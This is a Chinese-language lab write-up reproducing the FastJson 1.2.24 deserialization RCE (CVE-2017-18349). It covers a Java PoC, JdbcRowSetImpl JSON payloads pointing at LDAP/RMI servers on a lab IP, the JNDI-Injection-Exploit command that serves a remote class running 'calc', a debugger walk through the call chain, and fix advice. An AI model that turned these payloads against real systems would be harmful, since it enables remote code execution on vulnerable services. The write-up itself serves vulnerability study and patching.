# FastJson 1.2.24 反序列化 RCE 复现（精简版）

> 完整版（含排查过程与细节）：[FastJson 1.2.24 反序列化 RCE 漏洞分析.md](FastJson%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20RCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md)
>
> 本文只保留复现流程与调试过程，图片与原版一致。
>
> **来源与许可**：本文基于 **《代码审计 | FastJson 1.2.24 反序列化 RCE 漏洞分析》**（原文：https://wr0ld.github.io/posts/3035988a/ ）整理，
> 原文采用 [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) 协议，**本文同样以该协议发布，转载请注明原文出处**。详见文末「来源与许可」。

**漏洞编号**：CVE-2017-18349　**影响版本**：FastJson ≤ 1.2.24　**危害**：远程代码执行（RCE）

**成因**：FastJson 解析 JSON 时若发现 `@type` 字段，会将其值作为类名加载并实例化，再通过反射依次调用 setter 赋值。1.2.24 及以下版本该过程**没有任何类型校验**，攻击者可用 `com.sun.rowset.JdbcRowSetImpl` 这类 setter 中带危险行为的类作为利用链，触发 JNDI 查询并从远程加载恶意类，最终实现命令执行。

---

## 一、环境要求

| 项目 | 要求 |
| --- | --- |
| 靶机 JDK | **≤ 8u190**（8u121 起 RMI 通道受限，8u191 起 LDAP 通道受限） |
| FastJson | `1.2.24` |
| 利用工具 | `JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar` |
| 利用工具运行环境 | Java 8 及以上（JRE 即可） |

**靶机 JDK 版本与可用通道对照：**

| 靶机 JDK | RMI（1099） | LDAP（1389） |
| --- | --- | --- |
| < 8u121 | 可用 | 可用 |
| 8u121 ～ 8u190 | 不可用 | **可用** |
| ≥ 8u191 | 不可用 | 不可用 |

**判断本机 JDK 属于哪一档**（检查 `rt.jar` 里哪条通道带 `trustURLCodebase` 开关）：

```cmd
python -c "import zipfile;z=zipfile.ZipFile(r'E:\Tools\Java\jdk1.8.0_181\jre\lib\rt.jar');print('RMI:',b'trustURLCodebase' in z.read('com/sun/jndi/rmi/registry/RegistryContext.class'),'LDAP:',b'trustURLCodebase' in z.read('com/sun/jndi/ldap/Obj.class'))"
```

本机 8u181 实测输出（`RMI: True` 表示 RMI 有闸、`LDAP: False` 表示 LDAP 无闸）：

![image-20260922154401813](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922154401813.png)

---

## 二、搭建 Maven 项目

### 2.1 建 Maven 项目

![image-20260922103519257](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922103519257.png)

### 2.2 添加 FastJson 依赖

`pom.xml` 中添加：

```xml
<dependencies>
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.24</version>
    </dependency>
</dependencies>
```

### 2.3 下载依赖

![image-20260922103630678](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922103630678.png)

源代码也下载一下（调试时要能跳进 fastjson 源码）：

![image-20260922195912481](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922195912481.png)

---

## 三、@type 机制初探（User 例子）

### 3.1 创建 User 类

`src/main/java/org/example/User.java`：

```java
package org.example;

public class User {
    private String name;
    private int age;
    private String gender;

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public void setName(String name) {
        this.name = name;
        System.out.println("setName");
    }

    public int getAge() {
        System.out.println("getAge");
        return age;
    }

    public void setAge(int age) {
        this.age = age;
        System.out.println("setAge");
    }

    public String getGender() {
        System.out.println("getGender");
        return gender;
    }

    public void setGender(String gender) {
        this.gender = gender;
        System.out.println("setGender");
    }
}
```

### 3.2 修改 Main.java 测试解析

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class Main {
    public static void main(String[] args) {
        String Test = "{\"@type\":\"org.example.User\"," +
                "\"name\":\"wrold\"," +
                "\"age\":18}";

        JSONObject date = JSON.parseObject(Test);
        System.out.println(date);
    }
}
```

### 3.3 运行结果

![image-20260922115708287](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922115708287.png)

可以看到：

- `@type` 指向的是我们自己创建的类文件
- JSON 数据包含了 `name` 和 `age` 两个参数
- 在运行结果里，触发了 `setName`、`setAge`、`getAge`、`getName`
- 虽然没有定义 `gender` 参数，但仍然触发了 `getGender`

---

## 四、parseObject 两种调用方式的区别

如果把：

```
JSONObject date = JSON.parseObject(Test);
```

改成：

```
User user = JSON.parseObject(Test, User.class);
```

运行结果就不一样了：

![image-20260922143251479](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922143251479.png)

`JSON.parseObject(Test, User.class)` 只触发了 setter，没有触发任何 getter。

**两种调用方式的本质区别：**

| 调用方式 | 触发方法 | 返回类型 |
| --- | --- | --- |
| `JSON.parseObject(Test)` | setter + getter | JSONObject |
| `JSON.parseObject(Test, User.class)` | 只有 setter | User 对象 |

**这个区别在漏洞利用里非常关键：**

- **setter 型利用链** → 两种调用方式都能触发，`JdbcRowSetImpl` 就是这种
- **getter 型利用链** → 只有 `parseObject(Test)` 无类型版本才能触发，`TemplatesImpl` 的 `getOutputProperties` 就是典型

---

## 五、PoC 复现

### 5.1 编写 Payload

`src/main/java/org/example/Main.java` 改为：

```java
package org.example;

import com.alibaba.fastjson.JSON;

public class Main {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"ldap://192.168.13.1:1389/xxxxxx\"," +
                "\"autoCommit\":true}";
        JSON.parse(payload);
    }
}
```

### 5.2 启动 JNDI 服务

这里指定 rmi 地址，用的是 VMnet8 NAT 网卡地址：

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A "192.168.13.1"
```

这里看清楚选 1.8 的那一组。

靶机为 **8u181** 时（只能走 LDAP）：

![image-20260922152244707](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922152244707.png)

靶机为 **8u112** 时（RMI、LDAP 都可）：

![image-20260922164039715](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922164039715.png)

### 5.3 选取地址

| 分组 | 适用靶机 | 使用哪些地址 |
| --- | --- | --- |
| JDK 1.8 | JDK 8 且 RMI 未受限（< 8u121） | 该组 rmi 或 ldap |
| Tomcat / SpringBoot | 目标 classpath 含 Tomcat 8+ 或 SpringBoot 1.2.x+ | 该组 rmi |
| JDK 1.7 | JDK 7 | 该组 rmi 或 ldap |

### 5.4 修改 Payload 地址

把 payload 里的地址换成工具生成的对应地址。

**8u112**

rmi

```json
{
    "@type" : "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName" : "rmi://192.168.13.1:1099/xxxxxx",
    "autoCommit" : true
}
```

ldap

```json
{
    "@type" : "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName" : "ldap://192.168.13.1:1389/xxxxxx",
    "autoCommit" : true
}
```

**8u181**

ldap

```json
{
    "@type" : "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName" : "ldap://192.168.13.1:1389/xxxxxx",
    "autoCommit" : true
}
```

> 地址末尾那 6 位随机字符每次启动工具都会变，必须用工具本次打印出来的值。

### 5.5 成功弹出计算器

更换 JDK 运行版本记得改：右击【启动图标】→【修改运行配置】。

**8u112**

rmi 方式：

![image-20260922164457615](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922164457615.png)

![image-20260922165523282](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922165523282.png)

ldap 方式：

![image-20260922165939084](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922165939084.png)

![image-20260922170039141](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922170039141.png)

![image-20260922151948263](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922151948263.png)

**PoC 验证成功。**

---

## 六、三个端口的作用

| 端口 | 服务 | 作用 |
| --- | --- | --- |
| 1099 | RMI 注册表 | 被查询时返回 `Reference`，告知去哪获取类 |
| 1389 | LDAP 服务 | 被查询时返回含 `javaCodebase`、`javaFactory` 的条目 |
| 8180 | HTTP 服务 | 托管恶意 class 文件，供靶机下载 |

1099 与 1389 是两条并列的协议通道，任选其一（依据靶机 JDK 版本决定）；8180 是两条通道共同依赖的环节。

连接方向均由靶机主动发起：

![JNDI利用三端口角色与流量方向_修正编号](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/JNDI利用三端口角色与流量方向_修正编号.png)

```
靶机 →(查询)→ 1099 或 1389
     ←(返回 Reference，含 javaCodebase=http://<攻击机>:8180/)
靶机 →(下载)→ 8180 取得 ExecTemplateJDK8.class
靶机 本地加载并执行 → RCE
```

---

## 七、底层代码调试分析

### 7.1 入口分析

打断点进入函数：

在该位置按 `Ctrl+B`，转到 `JSON` 里面：

![image-20260922170328164](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922170328164.png)

直接看到用了 `parse()`：

![image-20260922170820463](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922170820463.png)

![image-20260922170938095](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922170938095.png)

所以 `JSON.parse(payload)` 同样能触发漏洞，不一定要用 `parseObject`。

> **注意返回类型不同**：`JSON.parse(String)` 返回 `java.lang.Object`，`JSON.parseObject(String)` 才返回 `JSONObject`。
> 所以 `JSONObject date = JSON.parse(payload);` 编译不过，应写成 `JSON.parse(payload);` 或 `Object date = JSON.parse(payload);`。

示例：

![image-20260922171830730](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922171830730.png)

### 7.2 @type 字段的识别

进入 `com/alibaba/fastjson/parser/DefaultJSONParser.java`，发现一个判断语句，判断是否有 `@type` 的值；判断成功后进入处理逻辑，`com.sun.rowset.JdbcRowSetImpl` 被提取出来赋值给了 `typeName`：

![image-20260922173624672](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922173624672.png)

### 7.3 任意类加载：TypeUtils.loadClass

接着触发了这个函数：

```
TypeUtils.loadClass(typeName, config.getDefaultClassLoader());
```

进去看看，一路的 if 语句都没有成立，最后停到了这里：

![image-20260922174620708](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922174620708.png)

```
className: "com.sun.rowset.JdbcRowSetImpl"      ← @type 的值
clazz:     "class com.sun.rowset.JdbcRowSetImpl" ← 字符串成功变成 Class 对象
```

**这就是漏洞的根源**：FastJson 解析 JSON 时如果发现 `@type` 字段，会调用 `TypeUtils.loadClass()` 把字符串值转成 `Class` 对象，然后实例化该类并通过反射调用对应的 setter 方法赋值——**任意类都可以被实例化，没有任何限制**。

### 7.4 找到 Deserializer

`DefaultJSONParser.parseObject` 继续往下执行，发现下面有一个 Deserializer，对象就是 `@type` 指定的 `com.sun.rowset.JdbcRowSetImpl`：

![image-20260922175803201](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922175803201.png)

![img](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/fastjson_image16.png)

### 7.5 逐步跟踪 setter 调用

与其一步一步跟链，不如直接在关键 setter/getter 上打断点，效率更高。需要关注的方法：

- `setDataSourceName`
- `getDataSourceName`
- `setAutoCommit`
- `getAutoCommit`

> 搜索 `setDataSourceName` / `getDataSourceName` 直接搜索搜不到函数，只能找到接口和定义。要找 `setAutoCommit` / `getAutoCommit`，需要用 **双击 Shift** 搜索类名 `JdbcRowSetImpl`，定位到 `JdbcRowSetImpl.class` 后再找对应方法。

`BaseRowSet.setDataSourceName`

![image-20260922181605264](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922181605264.png)

`JdbcRowSetImpl.setDataSourceName`

![image-20260922180555193](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922180555193.png)

`BaseRowSet.getDataSourceName`

![image-20260922181739608](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922181739608.png)

`JdbcRowSetImpl.setAutoCommit`

![image-20260922180913826](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922180913826.png)

`JdbcRowSetImpl.getAutoCommit`

![image-20260922180834235](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922180834235.png)

### 7.6 setDataSourceName 执行过程

再跑一遍调试，进入反序列化函数后，直接跳到下一个断点，到达了 `setDataSourceName`：

![image-20260922181144581](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922181144581.png)

`setDataSourceName` 被调用，传入 LDAP 地址 `ldap://192.168.13.1:1389/xxxxxx`，但此时 `dataSource` 为空，进入 else 判断：

![img](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/fastjson_image23.png)

`getDataSourceName` 被调用，但 `dataSource` 为空：

![image-20260922182422260](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922182422260.png)

父类 `setDataSourceName` 执行 `dataSource = name`，把 LDAP 或 RMI 地址真正存进去。

接下来执行了这个方法：

```
method.invoke(object, value);
```

![image-20260922211527483](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922211527483.png)

> **这行代码的位置**：`com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(Object, Object)` 的**第 96 行**。
> 也就是说 `method.invoke` 是 fastjson 自己写的反射调用，不是 JDK、也不是你的代码。

它做的事：等价于直接调用

```
object.setDataSourceName("ldap://192.168.13.1:1389/xxxxxx");
object.setAutoCommit(true);
```

有两个重要的参数：

- `ldap://192.168.13.1:1389/xxxxxx` —— 每次启动 JNDI 注入工具后，末尾 6 位都会变
- `com.sun.rowset.JdbcRowSetImpl`

### 7.7 setAutoCommit 触发 JNDI lookup

继续：

![image-20260922182716532](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922182716532.png)

进入 `setAutoCommit`，`conn` 为 `null`，走 else 分支：

![image-20260922182747523](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922182747523.png)

执行 `this.conn = this.connect()`：

![image-20260922182904609](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922182904609.png)

进入 `connect()`，从 `getDataSourceName` 取值：

![image-20260922182954039](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922182954039.png)

`getDataSourceName` 再次被调用，这次返回了 RMI 或 LDAP 地址，不为空，正常执行 try 里面的内容：

![image-20260922183157268](FastJson 1.2.24 反序列化 RCE 漏洞分析.assets/image-20260922183157268.png)

里面执行了 `lookup()`，就是 **JNDI lookup**，参数就是 RMI/LDAP 地址。

连接恶意 RMI/LDAP 服务，加载远程恶意类，**RCE 触发**。

---

## 八、完整调用链

```
Main.main(Main.java)
└─ JSON.parseObject(String)                        JSON.java:201
   └─ JSON.parse(String)                           JSON.java:128 / 137
      └─ DefaultJSONParser.parse()                 DefaultJSONParser.java:1293 / 1327
         └─ DefaultJSONParser.parseObject()        DefaultJSONParser.java:320-322   ← 识别 @type
            ├─ TypeUtils.loadClass(typeName)       TypeUtils.java:1018              ← 加载任意类
            ├─ ParserConfig.getDeserializer()      ParserConfig.java:360-367        ← 黑名单校验
            └─ deserializer.deserialze()           DefaultJSONParser.java:368
               └─ JavaBeanDeserializer.deserialze()      JavaBeanDeserializer.java:184 / 922 / 593
                  └─ FieldDeserializer.setValue()        FieldDeserializer.java:96  ← method.invoke 调用 setter
                     ├─ JdbcRowSetImpl.setDataSourceName()   存入地址
                     └─ JdbcRowSetImpl.setAutoCommit()       JdbcRowSetImpl.java:4067 反编译行号class:1278和实际有出入
                        └─ JdbcRowSetImpl.connect()          JdbcRowSetImpl.java:634 反编译class:316
                           └─ InitialContext.lookup(url)     ← 发起 JNDI 查询
                              → 下载并加载远程 class → 执行命令 → RCE
```

| 环节 | 位置 |
| --- | --- |
| `@type` 识别与任意类加载 | `DefaultJSONParser.java` 第 320-322 行 |
| 反射调用 setter | `FieldDeserializer.java` 第 96 行 `method.invoke(object, value)` |
| 触发 JNDI 查询 | `JdbcRowSetImpl.connect()`（第 634 行为异常抛出处） |

---

## 九、修复建议

1. **升级 FastJson**（首选）：1.2.25 起引入 `checkAutoType`，autotype 默认关闭并内置危险类黑名单；建议升级至最新版本，并开启 safeMode（1.2.68+：`ParserConfig.getGlobalInstance().setSafeMode(true)`）。
2. **收紧调用方式**：解析不可信数据时显式传入目标类型，`JSON.parseObject(text, DTO.class)`；避免使用不传类型的 `JSON.parseObject(text)`。
3. **升级 JDK**：升级至 8u191 及以上，可阻断 JNDI 远程类加载路径（属缓解措施，非根本修复）。
4. **其他**：不在公网暴露含反序列化处理的接口；对入参做过滤；定期扫描依赖版本。

---

## 来源与许可

- 原文：**代码审计 | FastJson 1.2.24 反序列化 RCE 漏洞分析** —— https://wr0ld.github.io/posts/3035988a/
- JDK 版本参考：https://www.cnblogs.com/yyhuni/p/8u191_jndi_inject.html
- FastJson 官方仓库：https://github.com/alibaba/fastjson

原文采用 [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) 许可协议。
本文作为其衍生整理（保留了原文的章节结构与调试截图，复现结果与截图均为自行实验所得），
**同样以 CC BY-NC-SA 4.0 协议发布**，转载请注明原文出处。
